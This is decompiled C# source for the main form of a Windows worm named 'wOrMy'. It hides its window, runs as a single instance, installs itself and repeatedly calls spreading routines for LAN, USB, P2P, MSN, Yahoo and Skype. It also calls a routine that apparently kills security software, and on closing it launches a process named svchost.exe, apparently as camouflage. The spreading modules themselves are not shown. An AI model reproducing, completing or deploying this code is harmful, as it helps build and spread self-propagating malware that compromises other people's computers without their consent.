using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace wOrMy;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private Mutex objMutex;

	private string yourmutex;

	public Form1()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		yourmutex = Environment.UserName + "MutexXx";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 264);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void Sleep(long dwMilliseconds);

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		objMutex = new Mutex(initiallyOwned: false, yourmutex);
		if (!objMutex.WaitOne(0, exitContext: false))
		{
			objMutex.Close();
			objMutex = null;
			ProjectData.EndApp();
		}
		install.inst();
		int num = default(int);
		while (true)
		{
			num = checked(num + 1);
			InjectX.injectX_Sp();
			lan.lan_sp();
			anti.killall();
			msnshare.msnshare_sp();
			p2p.p2p_sp();
			yahoo.yahoo_sp();
			skype.skype_sp();
			p22p.p22p_sp();
			usb.usb_sp();
			Sleep(1500000L);
			if (num == 3)
			{
				ProjectData.EndApp();
			}
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Process.Start("C:\\svchost.exe");
	}
}
